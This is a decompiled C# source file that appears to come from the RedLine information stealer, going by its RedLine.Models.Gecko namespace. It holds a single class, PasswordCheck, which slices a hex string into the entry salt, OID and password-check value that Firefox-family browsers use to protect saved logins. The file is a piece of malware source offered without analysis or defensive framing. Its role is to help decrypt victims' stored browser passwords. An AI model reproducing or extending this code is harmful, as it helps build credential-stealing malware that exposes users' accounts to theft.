using System;
using System.Globalization;

namespace RedLine.Models.Gecko
{
	// Token: 0x02000038 RID: 56
	public class PasswordCheck
	{
		// Token: 0x17000090 RID: 144
		// (get) Token: 0x06000171 RID: 369 RVA: 0x000048D6 File Offset: 0x00002AD6
		public string EntrySalt { get; }

		// Token: 0x17000091 RID: 145
		// (get) Token: 0x06000172 RID: 370 RVA: 0x000048DE File Offset: 0x00002ADE
		public string OID { get; }

		// Token: 0x17000092 RID: 146
		// (get) Token: 0x06000173 RID: 371 RVA: 0x000048E6 File Offset: 0x00002AE6
		public string Passwordcheck { get; }

		// Token: 0x06000174 RID: 372 RVA: 0x000048F0 File Offset: 0x00002AF0
		public PasswordCheck(string DataToParse)
		{
			int num = int.Parse(DataToParse.Substring(2, 2), NumberStyles.HexNumber) * 2;
			this.EntrySalt = DataToParse.Substring(6, num);
			int num2 = DataToParse.Length - (6 + num + 36);
			this.OID = DataToParse.Substring(6 + num + 36, num2);
			this.Passwordcheck = DataToParse.Substring(6 + num + 4 + num2);
		}
	}
}
